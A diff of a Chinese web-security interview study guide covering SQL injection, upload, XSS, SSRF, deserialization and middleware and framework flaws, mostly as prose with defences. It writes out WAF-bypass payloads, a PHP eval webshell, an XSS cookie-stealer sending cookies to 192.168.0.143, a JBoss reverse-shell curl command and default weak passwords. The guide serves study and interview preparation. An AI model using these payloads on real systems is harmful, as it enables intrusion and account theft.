@@ -1,16 +1,29 @@
 # **主要的Web漏洞**
+
 ## Sql注入
+
 ### 原理
+
 **网站数据过滤不严格，过分信赖用户输入的数据, 没有过滤用户输入的恶意数据，无条件的把用户输入的数据当作SQL语句执行，因此导致sql注入漏洞产生**
+
 ### Sql注入分类
+
 **以有无闭合字符分类：字符型、整数型**以数据传输方式分类：post类型、get类型**注入方式细分：联合查询注入、报错型注入、布尔型盲注、时间型盲注、宽字节注入**
+
 ### 报错注入常用函数：
+
 **UpdateXML() **Floor()**Extractvalue()**
+
 ### mysql默认存在的哪个数据库，注入时经常用到？
+
 **	Information_schema**
+
 ### 时间型盲注特点？常用函数？易受到什么影响？
+
 ** 场景：应用于无数据回显，无报错，布尔型盲注失效后 ** 特点：时间型盲注页面没有明显的回显，只能根据页面刷新时间的长短来去判断构造语句是否正确；** 常用函数: sleep函数 if条件语句 等** 易受网络波动影响**
+
 ### 布尔型盲注特点?常用函数？
+
 **特点:根据页面正确和错误的两种状态，来判断构造语句是否正确
 常用函数：
 length() #用以猜测数据返回字符串的长度
@@ -18,15 +31,17 @@ Sunstr() #截取字符串
 Mid() #取出字符串的一部分值
 Left() #取出字符串左边的几个数据
 Ascii() #返回一个字符的ascii码值**
+
 ### sql手注的一般步骤：
+
 **1、判断注入点
 2、判断注入类型
 3、判断注入点提交方式
 4、使用order by语句查询数据库有多少字段
 5、使用联合查询来查询 union select
- User（） 当前用户			
- Database() 数据库			
- Version() 数据库版本		
+ User（） 当前用户		
+ Database() 数据库		
+ Version() 数据库版本	
 6、查询数据库中的表、列和值**
 **数据库版本 version()    只有高版本才有系统库， 高版本：5.0以上       低版本：5.0以下**
 **系统库：infromation_schema**
@@ -40,91 +55,142 @@ Ascii() #返回一个字符的ascii码值**
 **. 下一级**
 **    infromation_schema.tables 查找表名**
 **    infromation_schema.columns 查看列名**
+
 ### 宽字节注入
+
 **有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义**
+
 ### Sql注入绕waf姿势(不用全都说，说几个就行)
+
 **1、函数大小写混合绕过: **可以绕过的原因：服务器端检测时未开启大小写不敏感**2、多重关键字绕过**可以绕过的原因:服务器端检测到敏感字符时替换为空 **形式：ununionion selselectect**3、编码绕过**可以绕过的原因：服务器端未检测或检测不严具有编码形式的关键字**编码类型：十六进制编码、URL编码、Unicode编码**4、注释绕过**可以绕过的原因：服务器端未检测或检测不严注释内的字符串**注释形式: 形式：/**/，/*!*/，/*!12345*/，#，-- -等**5、等价函数或命令绕过**可以绕过的原因：服务器端黑名单不完整，过滤不严**等价函数形式：**Mysql查询：Union distinct、updatexml、Extractvalue、floor**字符串截取函数：mid、substr、substring、left、reverse**字符串连接函数：concat、group_concat、concat_ws**字符串转换：char、hex、unhex**替换逗号：limit 1 offset 0，mid(version() from 1 for 1)**替换等号：like**6、特殊符号绕过**绕过原因：数据库中效果相同，服务器端却没有限制**形式：**科学记数法 and 1e0 = 1e0**空白字符 %0a %a0 %0b %20 %09**反单引号 `table_name`**括号 select * from (test.admin)**7、组合绕过**可以绕过原因：服务器端检测多处位置，需要多重绕过方式组合使用**形式：id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3**
+
 ### 什么样的网站可能存在sql注入漏洞？
+
 **和数据库有数据交互的这种网站，比如一些用php，asp这一类动态脚本写的网站**还有就是伪静态的网站，虽然看着是html的网站，但是实际上是动态网站和数据库有数据交互。**
+
 ### sql注入漏洞挂马利用成功的条件？（sql注入挂马）
+
 **1、支持联合查询**2、知道网站的绝对路径**3、上传马的路径允许写入文件**4、木马上传上去后能够被解析执行。**5、能够找到木马上传上去以后的位置。**
+
 ### 当你发现一个网站存在sql注入漏洞时，你会怎么进行挂马?
+
 **我会通过手注的方式和sqlmap进行挂马**
+
 ### 说下手注方式挂马用到什么函数？
+
 **union ,select ,into outfile**
+
 ### sqlmap挂马用什么参数？原理？
+
 **--os-shell 内置了一个方法select * into dumpfile，这个方法可以写入一个文件。**
+
 ### 你一般会怎么利用sql注入漏洞？
+
 **1、利用sql注入漏洞去读数据,一般读用户数据，网站可能有后台**2、利用sql注入挂马直接拿下服务器权限。**
+
 ### 如何挖掘sql注入漏洞?
+
 ** 首先我会看下这个网站是否是动态网站，然后通过手工注入或者使用sqlmap工具进行扫描。** 如果详细说的话，手注会先尝试用敏感字符进行尝试，，找出闭合字符，然后根据页面状态选择注入的模式，比如如果是联合查询，接下来就是判断列数，判断显示位，求网站当前数据库，求当前数据库所有表名，求指定表下列名，求指定列名下字段。**
+
 ### sql注入漏洞如何修复?
+
 **过滤恶意字符和函数（select union orderby）过滤或转义单引号双引号**使用参数化的语句来传递用户输入的变量**Sql预编译也可以预防**Sql预编译原理（PreparedStatement）**预编译语句PreparedStatement 是java.sql中的一个接口，它是Statement的子接口。通过Statement对象执行SQL语句时，需要将SQL语句发送给DBMS，由DBMS首先进行编译后再执行。
 ** （预编译语句创建对象时就指定了sql语句）**预编译语句和Statement不同，在创建PreparedStatement 对象时就指定了SQL语句，该语句立即发送给DBMS进行编译。当该编译语句被执行时，DBMS直接运行编译后的SQL语句，而不需要像其他SQL语句那样首先将其编译。预编译的SQL语句处理性能稍微高于普通的传递变量的办法**Sql注入getshell**●web目录具有写权限，能够使用单引号**●知道网站绝对路径**●secure_file_priv没有具体值（在mysql/my.ini中查看）**首先，利用outfile函数** into outfile**利用条件：web目录具有写权限，能够使用单引号**知道网站绝对路径（根目录，或则是根目录往下的目录都行）**secure_file_priv没有具体值（在mysql/my.ini中查看）** （secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。要修改secure_file_priv 的值为‘ ’才可以利用）
-**然后通过一些方法获取到了网站的根目录，则可以写入一句话 “ <?php eval($_REQUEST[1]);?> ”。一句话建议进行十六进制转码。**其次，利用--os-shell** --os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件。**利用条件：**●要求为DBA，--is-dba（phpstudy搭建的一般为DBA）**●secure_file_priv没有具体值**●知道网站的绝对路径**●GPC为off，php主动转义的功能关闭**
+**然后通过一些方法获取到了网站的根目录，则可以写入一句话 “ `<?php eval($_REQUEST[1]);?>` ”。一句话建议进行十六进制转码。**其次，利用--os-shell** --os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件。**利用条件：**●要求为DBA，--is-dba（phpstudy搭建的一般为DBA）**●secure_file_priv没有具体值**●知道网站的绝对路径**●GPC为off，php主动转义的功能关闭**
+
 ## 文件上传漏洞(RCE)
+
 ### (1)文件上传漏洞原理
+
 **开发人员未在文件上传点对文件名和文件内容做严格的过滤,导致用户可以上传恶意脚本到服务端。**
+
 ### (2)文件上传漏洞一般上传什么马?
+
 **符合网站语言环境的一句话、冰蝎、大马等等**
+
 ### (3)文件上传绕waf方式
+
 **绕过黑名单（大小写绕过）、绕过白名单%00截断（可以配合中间件漏洞），绕过前端验证(burp抓包修改Content-Type: 为允许的字段)，对文件内容进行绕过**
+
 ### (4)文件上传常用方式
 
-
 ### (5)当你进行文件上传时，发现网站是iis服务器你会上传什么后缀类型的马？
+
 **asp或者aspx
 
 ### (6)当你上传asp的脚本文件时上传不上去，你会上尝试再上传什么类型的后缀文件？为什么上传此类后缀的文件脚本
+
 **我会尝试将文件后缀名改为asa或者cdx或者cer尝试进行上传；
 Iis服务器开启了文件后缀扩展功能
 
-**
 ### (7)当你发现上传服务器是apache服务器，你会尝试上传什么后缀的马？
-**
+
+**php
+
 ### (8)当你发现上传服务器中间件是tomcat中间件，你会尝试上传什么后缀的马？
-**
+
+**Jsp
+
 ### (9)当你发现上传服务器中间件是weblogic中间件，你会尝试上传什么后缀的马？
-**
+
+****Jsp**
+
 ### (10)当你发现上传服务器中间件是nginx，你会尝试上传什么后缀的马？
-**
+
+****Php**
+
 ### (11)文件上传漏洞防护
+
 **防护：常见的防护措施比如文件类型可以通过白名单或者黑名单进行判断，当文件上传后对文件进行重命名呀，限制上传文件大小呀等。
 白名单比黑名单要更安全一些。**
+
 ### (12)文件上传绕waf
-**1 文件名大小写绕过
+
+**1、文件名大小写绕过
 用像 AsP，pHp 之类的文件名绕过黑名单检测
-2 名单列表绕过
+2、名单列表绕过
 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类
-3 特殊文件名绕过
+3、特殊文件名绕过
 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式
 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会
 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。
-4 htaccess 文件
+4、htaccess 文件
 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测
-5 写入方法
+5、写入方法
 首先名字为1.php:jpg，会写入一个1.php的空文件，然后再上传一个文件，然后修改名字为3.<<<
 这样就会把我们这个文件的内容写入到我们上传的那个1.php空文件中
 参考：**[**https://www.waitalone.cn/php-windows-upload.html**](https://www.waitalone.cn/php-windows-upload.html)**
-6截断绕过上传
+**6、截断绕过上传
 1.php .jpg 空格二进制20改为00
-还有一些图片木马之类的，需要结合文件包含漏洞来解析**
+还有一些图片木马之类的，需要结合文件包含漏洞来解析****
 
 ## 文件包含漏洞
+
 ### (1)文件包含漏洞原理
+
 **文件包含是指在程序编写过程中，为了减少重复的代码编写操作，将重复的代码采取从外部引入的方式，但如果包含被攻击者所控制，就可以通过包含精心构造的脚本文件来获取控制权，一般分为本地包含和远程包含，常出现在php等脚本语言中，包含命令主要有include,include_once,require,require_once。**
+
 ### (2)远程文件包含和本地文件包含的区别
+
 **本地文件包含只能包含本地的文件。** 远程文件包含要包含其他服务器的文件。若PHP配置选项allow_url_include为ON的话，则include函数是可以加载远程文件的。**
+
 ### (3) include,include_once,require,require_once这几个函数区别
+
 **Include() #找不到被包含的文件时只会产生警告，脚本继续运行**Require() #找不到被包含的文件时会发生致命错误，停止脚本运行**Include_once() #与include()类似，唯一区别是该文件中代码已经被包含，则不会再次包含**Require_once() #与require()类似，……（同上）**
+
 ### (4)文件包含漏洞修复
+
 **一般的防护手段包括 对文件进行敏感内容查找 或者限制文件类型等**
-## 
-xss漏洞（跨站脚本攻击）
+
+## xss漏洞（跨站脚本攻击）
+
 ### xss漏洞原理及防护
+
 **前提：当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击
  原理：攻击者利用相应的漏洞，在页面中嵌入JS脚本，用户访问含恶意脚本代码的页面或打开收到的URL链接时，用户浏览器自动加载执行恶意代码，达到攻击的目的。**
+
 ### 防护手段:
+
 **(1)过滤危险字符，输入长度限制，HTML实体编码等。
 (2)使用黑名单
 对于反射型和存储型，可以在数据返回客户端浏览器时，将敏感字符进行转义；
@@ -134,41 +200,64 @@ xss漏洞（跨站脚本攻击）
 存储型危害最大
 (4)为什么存储型xss危害最大?
 它是一种持久化的攻击，因为其恶意代码直接存储到了网站服务器中。
-(5)类型区别**反射型：经过后端，不经过数据库；**存储型：经过后端，经过数据库；**DOM型：不经过后端。**反射型是一次性的，用户访问带xss代码的请求时，服务器接受请求并处理，之后将带有xss代码的数据返回给浏览器，浏览器解析执行；**存储型中提交的恶意内容会被永久存储在数据库，攻击行为伴随攻击数据一直存在；**DOM型的触发基于浏览器对DOM数据的解析来完成，完全是客户端的事。**(6)标签：<script> <img> <javascript>**(7)利用：窃取管理员账号或者cookie；窃取个人信息或登录账号；发送钓鱼邮件。**(8)如何用xss（反射型）获取用户的cookie值：首先写一段js脚本，会用到document.get【cookie值】，然后把这个恶意脚本放到网站中的一些地方诱骗点击，点击后cookie值会被传送到我的电脑中来。**
+(5)类型区别**反射型：经过后端，不经过数据库；**存储型：经过后端，经过数据库；**DOM型：不经过后端。**反射型是一次性的，用户访问带xss代码的请求时，服务器接受请求并处理，之后将带有xss代码的数据返回给浏览器，浏览器解析执行；**存储型中提交的恶意内容会被永久存储在数据库，攻击行为伴随攻击数据一直存在；**DOM型的触发基于浏览器对DOM数据的解析来完成，完全是客户端的事。**(6)标签：`<script>` `<img>` `<javascript>`**(7)利用：窃取管理员账号或者cookie；窃取个人信息或登录账号；发送钓鱼邮件。**(8)如何用xss（反射型）获取用户的cookie值：首先写一段js脚本，会用到document.get【cookie值】，然后把这个恶意脚本放到网站中的一些地方诱骗点击，点击后cookie值会被传送到我的电脑中来。**
 在自己的服务器上放入如下代码：
+
 <?php
     $cookie = $_GET['cookie'];
     file_put_contents("cookie.txt",$cookie);
     echo '已成功获取cookie信息';
 ?>
+
 payload：
+
 <script>document.location=![](https://cdn.nlark.com/yuque/0/2023/png/23012500/1684121833693-4b7687f8-f31d-4375-93ef-f9947c01d3d7.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_9%2Ctext_c2h1YWlnZQ%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_20%2Climit_0#averageHue=%23305281&from=url&id=qKyz8&originHeight=15&originWidth=20&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)[http://192.168.0.143/cookie.php?cookie="+](http://192.168.0.143/cookie.php?cookie=%22+)document.cookie;</script>
+
 ## csrf漏洞（跨站请求伪造）
+
 ### csrf原理
+
 ** 原理：利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，受害人不知情的情况下会以受害者的身份向服务器发送请求，从而完成非法操作。**
+
 ### csrf漏洞修复
+
 **a：验证http头的referer：仅响应referer头带本域的请求。
  b：请求地址中添加token验证。
  c：使用localstorage和sessionstorage保存会话。**
+
 ### 类型
+
 **get请求型csrf：只需要构造url，然后诱导受害者访问；
  Post请求型csrf：构造自动提交的表单，诱导受害者访问或者点击。**
+
 ### 危害：
+
 **利用受害者身份发送邮件、发消息、盗取受害者的账号等**
+
 ### 与xss的区别：
+
 ![](https://cdn.nlark.com/yuque/0/2023/png/23012500/1684121834000-086f79d0-0bf6-45f8-a918-fd290bf7be17.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_18%2Ctext_c2h1YWlnZQ%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_644%2Climit_0#averageHue=%231c1e1f&from=url&id=imYEr&originHeight=342&originWidth=644&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
 ### 与ssrf的区别
+
 ** ccrf 是指攻击者盗用了你的身份，以你 的名义发送恶意请求，例如发送邮箱， 盗用账户，购买商品等。**ssrf 是指大型 网站 web 应用上提供了从其他服务器获取数据的功能，攻击者利用有缺陷的 web 应用作为代理远程攻击。**
+
 ## ssrf漏洞（服务端请求伪造）
-### 原理: 
+
+### 原理:
+
 **服务端提供了从其他服务器获取数据的功能，但是没有对目标地址进行过滤和限制。比如从指定的URL地址获取网页内容，加载指定地址的图片、数据、下载等等。
 一般情况下，我们服务端请求的目标都是与该请求服务器处于同一**[**内网**](https://www.yuque.com/hazel-tlnjt/iugito/ziqd7dtp6oye9mii?singleDoc)**的资源服务，但是如果没有对这个请求的目标地址、文件等做充足的过滤和限制，攻击者可通过篡改这个请求的目标地址来进行伪造请求。**
+
 ### ssrf漏洞修复：
+
 ** url白名单（限制不能访问内网的ip）
 过滤返回信息
 统一错误信息
 限制请求端口只能为web端口，只允许访问http和https的请求；**
+
 ### ssrf利用
+
 **1、可以对服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息
 2、攻击运行在内网或本地的应用程序（比如溢出）
 3、对内网web应用进行指纹识别，通过访问应用存在的默认文件实现；
@@ -176,47 +265,86 @@ payload：
 5、利用file协议读取本地文件
 6、利用Redis未授权访问，HTTP CRLF注入达到getshell
 7、DOS攻击（请求大文件，始终保持连接keep alive always）等等**
-### 绕过姿势 
+
+### 绕过姿势
+
 **1、(绕黑名单) 进制转换ip
 2、(绕白名单) 使用@在主机名之前的url中嵌入凭据；
 3、302跳转；
 4、DNS重绑定 **
+
 ## xxe漏洞（外部实体注入）
+
 ### 原理：
+
 ** 一些配置不当的xml处理器会对外部实体进行引用，如果攻击者可以上传xml文档或在xml文档中添加恶意内容，通过易受攻击的代码就能攻击包含缺陷的xml处理器。**
+
 ### 利用方式：
+
 **任意文件读取、系统命令执行、内网端口探测、攻击内网网站、钓鱼**
+
 ### 修复防御：
+
 **1、使用开发语言提供的禁用外部实体的方法；
 2、过滤提交的xml数据；（过滤SYSTEM等敏感关键字）**
+
 ## 逻辑漏洞
+
 ### 原理：
-**
+
+**攻击者利用业务或功能上的设计缺陷，获取敏感信息或破坏业务完整性。**
+
 ### 什么是越权？分类？
-** 越权访问 原理：越权的本质是失效的访问控制，即未对通过身份验证的用户实施恰当的访问控制。对客户端请求的数据遗漏了权限的判定，验证一旦不充分，就容易出现越权漏洞。**分类 一般分为水平越权和垂直越权**水平越权可以不经过验证操作其它同等权限的账号（相同权限的用户之间可以越权访问）**
+
+**越权访问 原理：越权的本质是失效的访问控制，即未对通过身份验证的用户实施恰当的访问控制。对客户端请求的数据遗漏了权限的判定，验证一旦不充分，就容易出现越权漏洞。**分类 一般分为水平越权和垂直越权**水平越权可以不经过验证操作其它同等权限的账号（相同权限的用户之间可以越权访问）**
+
 ### 常见的逻辑漏洞有哪些？
+
 **支付逻辑，短信逻辑，越权漏洞等**短信逻辑漏洞（短信轰炸漏洞）**
+
 ### 普通的安全加固手段？
-** 答：关闭不常用的端口和服务；开启防火墙，不允许外部USB设备的插入；数据库不允许匿名登陆等，漏洞扫描修复，修改一些中间件或系统的配置文件。**
+
+ *答：关闭不常用的端口和服务；开启防火墙，不允许外部USB设备的插入；数据库不允许匿名登陆等，漏洞扫描修复，修改一些中间件或系统的配置文件。**
+
 ### 安全加固手段：
-**1关闭不常用端口与服务；**2开启防火墙，不允许外部usb设备插入；**3数据库不允许匿名登录；**4对可控参数进行严格的检查与过滤。
+
+1关闭不常用端口与服务；
+
+2开启防火墙，不允许外部usb设备插入；
+
+3数据库不允许匿名登录；
+
+4对可控参数进行严格的检查与过滤。
 
 命令执行漏洞是执行系统命令
 代码执行漏洞是执行后端脚本命令(比如php的代码)**
+
 ## 命令执行漏洞
+
 ### 原理：
+
 **程序应用有时需要调用一些执行系统命令的函数，如php中的system、exec、shell-exec、passthru、popen、proc_open、assert、putenv
+
 ### 漏洞条件：
-**
+
+**用户能够控制的函数输入；存在可以执行代码或系统命令的危险函数。**
+
 ### 基本定义：
-**
+
+**指攻击者可以随意执行系统命令。**
+
 ### 利用（危害）：
-**
+
+**继承web服务程序的权限去执行系统命令（任意代码）或读写文件；反弹shell；控制整个网站甚至服务器；进一步内网渗透。**
+
 ### 防御：
+
 **尽量不执行外部指令；使用自定义函数或函数库来替代外部命令的功能；使用escapeshellerg函数来处理命令参数。**
 
 ## 反序列化漏洞
+
 ### 原理
+
 **首先了解一下序列化和反序列化的含义：
 序列化是指Java对象转化为二进制内容，转换的原因就是为了便于网络传输和本地存储。
 反序列化的含义是将相应的二进制转换为Java对象。
@@ -224,10 +352,14 @@ payload：
 **常用函数：（php反序列化）围绕：serialize()和unserialize()这两个函数展开**常用的魔术函数：1、_construct() #当一个对象创建时被调用** 2、_destruct()  #当一个对象被销毁时被调用** 3、_tostring()  #输出的时候自动调用** 4、_sleep() #在对象在被序列化之前运行** 5、_wakeup #将在序列化之后立即被调用**
 
 ## http协议相关
+
 ### http请求方法
+
 ![](https://cdn.nlark.com/yuque/0/2023/png/23012500/1684121834420-10bd0051-6526-4d0a-bfbc-08785fd7515a.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_22%2Ctext_c2h1YWlnZQ%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_781%2Climit_0#averageHue=%23e3e3e3&from=url&id=BUms2&originHeight=368&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
 **其中一般来用作扫描的方法是?哪个方法扫描要快一些**get和head。**Head方法快一些**用什么方法探测服务器开启了什么方法？**options**
+
 ### http状态码
+
 100：服务器已经接收到第一段请求,正在等待接受后续请求
 1xx：请求已被接收（100-102）
 2xx：请求已被成功接收理解并接受（200-207）
@@ -245,7 +377,9 @@ payload：
 500：服务器发生不可预期的错误
 503：服务暂时不可用（表示服务器繁忙）
 600：源站没有返回响应头部，只返回实体内容
+
 ### http字段：
+
 Host  请求的web服务器域名地址（对方的ip）
 User-Agent  当前HTTP请求的客户端浏览器类别（包括浏览器类型、操作系统及版本、CPU类型、浏览器渲染引擎、浏览器插件等信息）
 Accept 告诉服务器能够发送哪些媒体类型
@@ -256,7 +390,7 @@ TE11 告诉服务器可以使用哪些扩展传输编码
 Content-Encoding 对主体执行的任意编码方式
 Content-Length 主体的长度或尺寸
 Content-Type 这个主体的对象类型（第二后缀名）
-Authorization 包含了客户端提供给服务器，以便对其自身进行认证的数 据 
+Authorization 包含了客户端提供给服务器，以便对其自身进行认证的数 据
 Cookie 客户端用它向服务器传送一个令牌，它并不是真正的安全首部，但确实隐含了安全功能
 Cookie2 用来说明请求端支持的cookie 版本，参见11.6.7节
 Referer 告诉服务器该网页是从哪个页面链接过来的
@@ -267,47 +401,179 @@ Keep-Alive  使客户端到服务器端的连接持续有效，后继请求时�
 X-Recuested-with: XMLHttpRecuest
 Date  响应时间
 Server  服务器中间件和源码信息
+
 ## 中间件漏洞
+
 ### 存在目录遍历漏洞的中间件有哪些？
+
 **Iis、apache、nginx**
+
 ### 存在war后门文件部署？
+
 **Tomcat、weblogic、jboss**iis**Put漏洞（本质是任意文件上传）**原理：IIS开启了WebDAV配置了可以写入的权限，造成了任意文件上传漏洞。**防御：关闭webDAV；关闭写入权限**解析漏洞**原理：6.0版本默认将*.asp;.jpg此类格式的文件名，当成asp解析，服务器默认；后面的内容不解析，相当于截断，例如上传asp木马，就可以用xx.asp;.jpg来绕过；iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp**防御方法：** 1.禁止上传和创建此类畸形文件** 2.图片存放目录设置为禁止脚本执行**1短文件名猜解**原理：IIS的短文件名机制，可以暴力破解文件名。访问构造某个存在的短文件，会返回404，访问构造某个不存在的短文件，会返回400。使用payload验证目标是否存在短文件漏洞，显示404时，说明存在短文件。**防御方法：1、升级.net framework**		 2、修改注册表键值：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。**命令行关闭 fsutil behavior set disable8dot3**Apache**解析漏洞（未知拓展名解析漏洞）**原理：apache默认一个文件可以有多个以点切割的后缀，当最右的后缀无法识别时，就继续向左识别，直到识别到合法后缀才开始解析，如xxx.php.qqq，qqq无法识别，就继续解析，到php时能够识别，就解析为php文件**目录遍历**原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是../，也可是../的ASCII编码或者是unicode编码等。**目录遍历的标志：Index of /**防御措施：修改httpd.conf文件中的参数**tomcat**弱口令+war后门文件部署**原理：tomcat如因配置不当导致未授权直接登录后台，或者由于弱口令的存在登录后台，可以在后台上传war包，我们可以将jsp代码植入到war包里面，然后访问该war包即可执行jsp代码。** war包制作命令,在jdk目录下： jav cvf shell.war 1.jsp 完成制作** 同时msf的exploit/multi/http/tomcat_mgr_upload模块可以执行此操作**原理：在tomcat-users.xml中定义了tomcat用户的信息与权限，弱口令得到后访问http：//127.0.0.1：8080/manager/html，打开管理页面，输入用户名密码登录后台，用“WAR file to deploy”上传挂马。之后访问一句话木马即可。**put任意文件上传**原理：tomcat允许适用put方法上传任意文件类型，但不允许jsp后缀文件上传，因此我们需要配合windows的解析漏洞，适用诸如 1.jsp%20 、 1.jsp::$DATA 则可以成功绕过检测上传成功。**注意：若是linux + tomcat5.0~9.0 ，可以上传1.jsp/绕过**nginx**文件解析漏洞**原理：用户配置不当造成的解析漏洞。由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加/xxx.php（xxx）为任意字符后，即可将文件作为php解析。** 例如：在1.jpg中写入一句话木马，上传1.jpg/xxx.PHP**防御手段：1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0** 		 2、 php-fpm.conf中的security.limit_extensions后面的 值设置为.php **目录遍历**原理：Nginx的目录遍历与apache一样,属于配置方面的问题,错误的配置可导致目录遍历与源码泄露。（程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是../，也可是../的ASCII编码或者是unicode编码等。）**修复：将nginx.conf中的autoindex on 中的“on”改为“off”**CRLF注入漏洞**原理：CRLF是”回车+换行”(rn)的简称,其十六进制编码分别为0x0d和0x0a。在HTTP协议中,HTTP header与HTTP Body是用两个CRLF分隔的,浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以,一旦我们能够控制HTTP消息头中的字符,注入一些恶意的换行,这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。**修复：修改一些配置文件**jboss**反序列化漏洞（HttpInvoker 组件（CVE-2017-12149））**原理：存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了攻击者可以在服务器上执行任意代码。**漏洞验证** 访问/invoker/readonly，返回500，说明此页面存在反序列化漏洞
 **过程：**开两个终端，一个进行监听（nc -lvnp 12345），另一个发payload**curl **[**http://192.168.50.169:8080/invoker/readonly**](http://192.168.50.169:8080/invoker/readonly)** --data-binary @ReverseShellCommonsCollectionsHashMap.ser**（@不能省略）** 最后，成功反弹shell**弱口令+war后门文件部署**原理：admin/admin弱口令登录后台，点击add a new resource上传war包，连马即可**防御：改强密码；删除admin-console页面**weblogic**弱口令+war后门文件部署**原理：通过弱口令（weblogic/Oracle@123）登录管理台后，点击部署，安装，上传war包**反序列化**原理：Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。**SSRF漏洞**原理：Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。**过程：比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口，进而攻击内网中redis、fastcgi等脆弱组件。**
 
 ## 框架及其漏洞
-**★Apache Shiro★**指纹信息：**请求包中，在Cookie信息中给 rememberMe变量赋任意值，收到返回包的 Set-Cookie 值存在 rememberMe=deleteMe 字段，说明目标使用了Shiro框架。**漏洞原理：**Shiro-550**Apache Shiro框架提供了RememberMe的功能，用户登录成功后会生成经过加密并编码的cookie，在服务端接收cookie后，Base64解码->AES解密->反序列化。**攻击者只要找到AES加密的密钥，就可以构造恶意对象，对其进行序列化->AES加密->Base64编码，然后将其作为cookie的rememberMe字段发送，对方服务器将rememberMe进行解密并且反序列化，最终造成恶意对象执行，导致反序列化漏洞。**Shiro-721(问的概率小，选看)**在Apache Shiro框架的cookie中，带有加密的rememberMe字段存在问题，会受到Padding Oracle攻击。攻击者无需知道RememberMe的加密秘钥，直接使用RememberMe的cookie作为Padding Oracle Attack的前缀，然后把精心制作的恶意语句写入RememberMe字段，从而执行反序列化攻击。**550和721的区别：550需要AES加密的密钥，721不需要；721是通过Padding Oracle生成加密的攻击代码，而550是通过AES加密生成的攻击代码**实践与利用：**Shiro-550**1、首先拿到一个登录框，输入信息，勾选Remember Me后提交。**2、抓包，查看返回的数据包中set-Cookie字段存在remenberme=deleteme(判断存在漏洞)**3、使用ysoserial中的监听模块，监听6666端口(为第5步拿到密钥做准备)**4、在自己的电脑上，用nc监听7777端口(为第6步拿到shell做准备)**5、使用py脚本获取shiro的AES密钥。有了密钥之后，再用py脚本生成payload**6、最后，重新登录抓包，把包中的cookie值替换为步骤5中的payload，反弹sehll成功**Shiro-721**1、首先登录网站，并从cookie中获取rememberMe字段(该漏洞必须在登录Shiro的前提下才可能利用成功)**2、拿到rememberMe cookie后，用它作为Padding Oracle攻击的前缀；**3、打开ysoserial工具，加密一条Java序列化Payload，构造恶意rememberMe；**4、最后使用构造好的恶意rememberMe重新请求网站，进行反序列化攻击，最终导致远程代码执行。**快速理解：**Shiro漏洞的本质是处理cookie的流程有问题。**漏洞的关键点就在于找到AES的加密秘钥，AES的密钥是硬编码在代码里。**修复建议：**(有时间再补充)**★ThinkPHP★**指纹信息：**url上输入**[**http://192.168.xx.xx/ThinkPHP/logo.png**](http://192.168.xx.xx/ThinkPHP/logo.png)**，出现如下图片。该图片也存在于title中。**除此之外，“十年磨一剑”也是Thinkphp的重要特征。**漏洞原理：**程序未对控制器进行过滤，导致攻击者可以通过引入\符号来调用任意类方法。从而使框架存在代码执行漏洞，攻击者可以利用构造的恶意URL执行任意代码。**比如index.php?s=index/\namespace\class/method，在解析url时，会实例化\namespace\class类并执行任意method方法**举个例子：[**http://192.168.xx.xx/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=**](http://192.168.xx.xx/public/index.php?s=index/%5Cthink%5C